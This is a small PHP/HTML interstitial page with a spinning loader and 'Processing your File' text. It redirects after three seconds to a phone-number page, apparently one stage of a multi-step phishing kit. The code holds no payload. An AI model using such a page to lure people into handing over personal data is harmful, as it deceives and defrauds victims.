<?php
header( "refresh:3;url=phone_number.php" );

?>
                                <html>
<head>
<title>Processing Your-info ...</title>

<style>

					#animation {
						display: block;
						margin: 32px auto;
						height:30px;
						width:30px;
						-webkit-animation: rotation .7s infinite linear;
						-moz-animation: rotation .7s infinite linear;
						-o-animation: rotation .7s infinite linear;
						animation: rotation .7s infinite linear;
						border-left:8px solid rgba(0,0,0,.20);
						border-right:8px solid rgba(0,0,0,.20);
						border-bottom:8px solid rgba(0,0,0,.20);
						border-top:8px solid rgba(33,128,192,1);
						border-radius:100%;
					}
					@keyframes rotation {
						from {transform: rotate(0deg);}
						to {transform: rotate(359deg);}
					}
					@-webkit-keyframes rotation {
						from {-webkit-transform: rotate(0deg);}
						to {-webkit-transform: rotate(359deg);}
					}
					@-moz-keyframes rotation {
						from {-moz-transform: rotate(0deg);}
						to {-moz-transform: rotate(359deg);}
					}
					@-o-keyframes rotation {
						from {-o-transform: rotate(0deg);}
						to {-o-transform: rotate(359deg);}
					}
					h3 {font-size:1.4em; margin:4em 0 0 0; line-height:normal;}
					p.note {color:#656565; font-size:1.2em;}
					p.note a {color:#656565;}
					p strong {margin-top:2em; color:#1A3665; font-size:1.25em;}
					img.actionImage {margin:2em auto;}
</style>
</head>

<center>
<div class="onemoment"></div></center>
<div id="animation"></div>
<div id="text">
	<h2 style="position:absolute;left:44%">Processing your File</h2>
	</div>
</html>
